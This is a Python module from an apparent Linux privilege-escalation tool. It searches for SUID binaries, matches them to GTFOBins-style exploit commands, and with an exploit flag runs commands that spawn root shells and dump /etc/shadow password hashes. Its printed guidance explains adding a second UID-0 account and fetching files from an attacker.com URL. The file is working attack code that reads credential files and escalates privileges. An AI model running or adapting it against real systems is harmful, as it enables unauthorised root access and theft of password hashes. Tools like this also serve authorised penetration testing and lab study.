# !/usr/bin/python3
from subprocess import run, PIPE
from Scripts.settings import *
from Scripts.gtfobins_database import database_dict

"""
find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.

find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)

find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null

read shadow file and extract all users hash

"""

progress = Progress()


def unpack_command_list(commands, silence):
    cmd_to_return = []
    for cmd in commands:
        if not any(c in cmd for c in ["sudo", "file_to_read"]) and cmd != "":
            if not silence:
                output(LIGHT_ESCYAN + cmd + END)
            cmd_to_return.append(cmd)
    return cmd_to_return


def replace_strings(commands, bin_name, bin_directory, file_to_read=False):
    if file_to_read:
        replacements = {"file_to_read": "/etc/shadow", "$LFILE": "/etc/shadow", f"./{bin_name}": bin_directory,
                        f"./{bin_name} file_to_read": f"{bin_directory} /etc/shadow"}
    else:
        replacements = {f"./{bin_name}": bin_directory}

    # replace some strings and commands to be able to read /etc/shadow
    for i in range(len(commands)):
        for key, value in replacements.items():
            commands[i] = commands[i].replace(key, value)

    return commands


def result_find_suid(grep_users, silence, exploit):
    vuln_bin_table = []
    # find vulnerable binaries in the system
    find_suid_binaries = "find / -perm -4000 2>/dev/null"
    result = run(find_suid_binaries, shell=True, stdout=PIPE).stdout.decode().strip().split("\n")

    progress.running = False
    possible_vulnerable_bins = []

    # exception for "as" and "ar" binaries
    if "/usr/bin/x86_64-linux-gnu-as" in result:
        possible_vulnerable_bins.append("as")
    if "/usr/bin/x86_64-linux-gnu-ar" in result:
        possible_vulnerable_bins.append("ar")

    for bin_directory in result:
        bin_name = bin_directory.split("/")[-1]
        if bin_name in database_dict.keys():
            possible_vulnerable_bins.append(bin_directory)

    possible_vulnerable_bins.sort()  # sort the list in alphabetic order
    if len(possible_vulnerable_bins) > 0:
        for bin_directory in possible_vulnerable_bins:
            bin_name = bin_directory.split("/")[-1]  # binary name
            command_list = database_dict[bin_name][
                1]  # command list from the dictionary of commands based on the binary name
            if len(command_list) > 0:
                if any("file_to_read" in cmd for cmd in command_list):

                    command_list = replace_strings(command_list, bin_name, bin_directory, True)
                    command_to_execute = command_list[-1]

                    # SUID to read found text
                    if not silence:
                        output(end="\r")
                        output(f"{BG_Red}SUID BINARY FOUND: {bin_name.upper() + END}"
                               f"\nThis binary can be used to read files using superuser permission. e.g. /etc/shadow.\n\n")

                    # adds to the list for the html table
                    vuln_bin_table.append([bin_directory, command_to_execute,
                                           "This binary can be used to read files using superuser permission. e.g. /etc/shadow."])

                    # if the length of the command list is greater than 2 it might have multiple ways of exploiting it or multiple commands
                    if len(command_list) > 2:
                        if not silence:
                            output(f"{GREEN}There might be multiple ways to exploit this binary.\n"
                                   f"You may want to try the following commands to read {ITALIC + LIGHTGRAY}/etc/shadow{END}")

                        # this just get rid of the empty commands or some other commands not necessary
                        # the cmd_to_append list is only used to append the commands to the html table
                        vuln_bin_table[-1][1] = "<br>".join(unpack_command_list(command_list, silence))

                    # else there is only one way of exploiting and exploit flag is True
                    elif exploit and not silence:
                        output(f"Trying to read {ITALIC}\"shadow\"{END} file...\n")
                        # execute the las command in the list which reads the shadow file

                        possible_hash_output = ""

                        # exception for ASPELL and WHIPTAIL (these two binaries crashes the shell)
                        if bin_name not in ["aspell", "whiptail"]:
                            possible_hash_output = run(
                                f"timeout 10 {command_to_execute} 2>&1 | {grep_users} | cut -d ':' -f 1,2 | sed -E 's,:.*,{RED}&{END},'",
                                shell=True,
                                stdout=PIPE).stdout.decode()  # grep users and cut from shadow file, showing only the user and the hash

                        if possible_hash_output:
                            output()
                            output(f"{YELLOW}Possible hashes found:{END}\n"
                                   f"{possible_hash_output}\n"
                                   f"{GREEN}If you see part of hashes, or error message above it could mean that the command works "
                                   f"but the output is messy.\n"
                                   f"You may want to try to execute the command bellow to make sure.\n"
                                   f"You may also substitute '/etc/shadow' for another file to read. \n\n"
                                   f"{ITALIC + LIGHTGRAY + command_to_execute + END}\n")

                        else:
                            output(f"{GREEN}Couldn't read shadow file from here.\n"
                                   f"This binary might be using another editor to read the file, or the output is messy.\n"
                                   f"You may try reading it using the following command: {ITALIC}\n\n"
                                   f"{LIGHTGRAY + ITALIC + command_to_execute + END}\n")
                    elif not silence:
                        output(f"You may want to try to execute the command bellow to make sure.\n"
                               f"You may also substitute '/etc/shadow' for another file to read. \n\n"
                               f"{ITALIC + LIGHTGRAY + command_to_execute + END}\n")

                elif any(any(x in cmd for x in ["file_to_write", "file_to_send", "file_to_save"]) for cmd in
                         command_list):

                    command_list = replace_strings(command_list, bin_name, bin_directory)

                    if not silence:
                        # SUID to read found text
                        output(end="\r")
                        output(f"{BG_Red}SUID BINARY FOUND: {bin_name.upper() + END}"
                               f"\nThis binary can be used to write to other files using superuser permission.\n"
                               f"{GREEN}For example you might want to use this to exploit the possibility of adding a new user with "
                               f"the UID 0 to {END}{ITALIC + LIGHTGRAY}\"passwd\" {END}{GREEN}or{END}{ITALIC + LIGHTGRAY} \"shadow\"{END}{GREEN} "
                               f"files and then escalate your privileges to that user.\n")
                        if exploit:
                            output(
                                f"This script CANNOT exploit this binary even if the exploit flag is selected as it will overwrite some files. Test this at your own risk!\n\n")
                        output(f"{YELLOW}You may try the following commands.")

                        # this just get rid of the empty commands or commands that has sudo in it
                        cmd_to_append = unpack_command_list(command_list, silence)
                        vuln_bin_table.append((bin_directory, "<br>".join(cmd_to_append),
                                               "This binary can be used to write to other files using superuser permission."))

                        if any("file_to_write" in cmd for cmd in command_list):
                            output(f"{YELLOW}- LFILE is the file you want to write to (passwd, shadow)\n"
                                   f"- DATA is the data you are writing.\n"
                                   f"- Example of data which creates a second root account (swap the encrypted password for your own):\n"
                                   f"- root2:ENCRYPTEDPASSWORD:0:0:root:/root:/bin/bash{END}")

                        else:
                            output(
                                f"{YELLOW}- URL is the attackers path to the file to inject in the vulnerable machine in the format "
                                f"of http://attacker.com/file_to_get\n"
                                f"- LFILE is the output file.\n"
                                f"Example, you might want to overwrite the passwd or shadow file with a user that has UID 0 (root id){END}")
                        output()

                elif any("file_to_change" in cmd for cmd in command_list):
                    if not silence:
                        output(end="\r")
                        output(f"{BG_Red}SUID BINARY FOUND: {bin_name.upper() + END}\n"
                               f"This binary can be used to change a file permission."
                               f"You may want to try and change the permission on the \"shadow\" file using the command(s) bellow.")
                        if exploit:
                            output(
                                f"This script CANNOT exploit this binary even if the exploit flag is selected as it will change some files. Test this at your own risk!\n\n")
                        output(f"{YELLOW}You may try the following commands.")

                    cmd_to_append = unpack_command_list(command_list, silence)
                    vuln_bin_table.append((bin_directory, "<br>".join(cmd_to_append),
                                           "This binary can be used to change a file permission."))

                else:
                    command_list = replace_strings(command_list, bin_name, bin_directory)
                    # command that executes a root shell and reads the contents of shadow
                    invoke_shell = command_list[0]
                    cmd_to_append = invoke_shell
                    if not silence:
                        output(end="\r")
                        # binaries that are not read or write - can try invoking a root shell straight away, this script cant do that.
                        output(f"{BG_Red}SUID BINARY FOUND: {bin_name.upper() + END}"
                               f"\nThis binary is not a read, write or change type of binary.\n"
                               f"You may invoke a ROOT SHELL using the following command(s):")

                        # exception list that crashes the shell.
                    if bin_name in ["jjs", "debugfs", "watch"] or len(command_list) > 1:
                        if exploit and not silence:
                            output(f"{YELLOW}Note: This script CANNOT invoke a shell using this binary.{END}")
                        cmd_to_append = unpack_command_list(command_list, silence)

                    elif exploit:
                        output(f"\n{LIGHTGRAY + ITALIC}{invoke_shell}{END}")
                        output()

                        # add -c "cat /etc/shadow" to invoke a shell and read the shadow file
                        if " -p" in invoke_shell:
                            if "'" in invoke_shell:  # some commands might have '' in it
                                invoke_shell = invoke_shell.replace(" -p", " -p -c \"cat /etc/shadow\" ")
                            else:
                                invoke_shell = invoke_shell.replace(" -p", " -p -c \"cat /etc/shadow\" ")
                        else:
                            invoke_shell = invoke_shell + " -c \"cat /etc/shadow\" "

                        output(f"Trying to invoke a root shell and read the {ITALIC}\"shadow\"{END} file.")
                        # invoke root shell and strip the contents of shadow
                        result = run(f"{invoke_shell} | {grep_users} | cut -d ':' -f 1,2 | sed -E 's,:.*,{RED}&{END},'",
                                     shell=True, stdout=PIPE).stdout.decode()
                        output(result)

                        output(
                            f"{YELLOW}Note: If you dont see the hashes above it means that it may drop the SUID privileges "
                            f"depending on the compilation flags and the runtime configurations.\n"
                            f"But if you see the hashes it means it successfully invoked a root shell.{END}")
                        output()

                    vuln_bin_table.append(
                        (bin_directory, "<br>".join(cmd_to_append) if type(cmd_to_append) == list else cmd_to_append,
                         "his binary is not a read, write or change type of binary.<br>This binary can invoke a root shell."))

    elif not silence:
        output(f"No vulnerable SUID found in the system.\n")

    return vuln_bin_table


def find_suid(grep_users, silence, exploit):
    progress_thread = CThread(target=lambda: progress.progress_func(silence))
    result_findings_thread = CThread(target=lambda: result_find_suid(grep_users, silence, exploit))

    progress_thread.start()
    result_findings_thread.start()

    progress_thread.join()
    return result_findings_thread.join()
